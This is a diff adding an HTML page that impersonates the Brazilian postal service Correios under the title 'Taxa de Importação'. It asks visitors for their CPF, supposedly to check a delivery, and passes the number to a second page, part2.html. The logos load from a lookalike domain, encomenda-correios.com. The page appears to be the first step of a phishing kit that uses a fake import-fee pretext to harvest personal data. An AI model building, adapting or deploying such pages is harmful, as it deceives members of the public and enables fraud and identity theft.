@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Taxa de Importação - Correios</title>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link rel="manifest" href="site.webmanifest">
+    <link rel="mask-icon" href="safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    <meta name="description" content="Pagamento de taxa dos Correios">
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #f8f9fa;
+            position: relative;
+        }
+        .content {
+            text-align: center;
+            width: 100%; /* Corrigido para 100% */
+            max-width: 1200px;
+            padding: 40px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
+            background-color: #fff;
+            border-radius: 15px;
+            margin-bottom: 150px;
+        }
+        .form-group {
+            margin-bottom: 30px;
+            color: #00416b;
+        }
+        label {
+            font-size: 22px;
+            display: block;
+            margin-bottom: 15px;
+        }
+        input.form-control {
+            font-size: 18px;
+            padding: 15px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            padding: 18px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .logo-bottom {
+            position: absolute;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .logo-bottom img {
+            width: 120px;
+        }
+        @media (max-width: 768px) {
+            input.form-control, button {
+                font-size: 16px;
+                padding: 12px;
+            }
+        }
+    </style>
+    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+</head>
+<body>
+    <div class="content">
+        <div class="logo">
+            <img src="https://encomenda-correios.com/entrega/mobile/correios.svg" alt="Correios">
+        </div>
+        <br>
+        <form id="form-part1">
+            <div class="form-group">
+                <b>Insira seu CPF para consultar sua entrega.</b>
+                <br>
+                <input type="text" class="form-control" id="cpf" name="cpf" placeholder="000.000.000-00" required maxlength="14">
+            </div>
+            <button type="submit">CONSULTAR ENTREGA</button>
+        </form>
+    </div>
+    <div class="logo-bottom">
+        <img src="https://encomenda-correios.com/entrega/mobile/correios.svg" alt="Correios">
+    </div>
+    <script>
+        $(document).ready(function(){
+            $('#cpf').mask('000.000.000-00');
+        });
+
+        document.getElementById('form-part1').addEventListener('submit', function(event) {
+            event.preventDefault(); // Impede o envio padrão do formulário
+            var cpf = document.getElementById('cpf').value;
+            window.location.href = 'part2.html?cpf=' + encodeURIComponent(cpf);
+        });
+    </script>
+</body>
+</html>
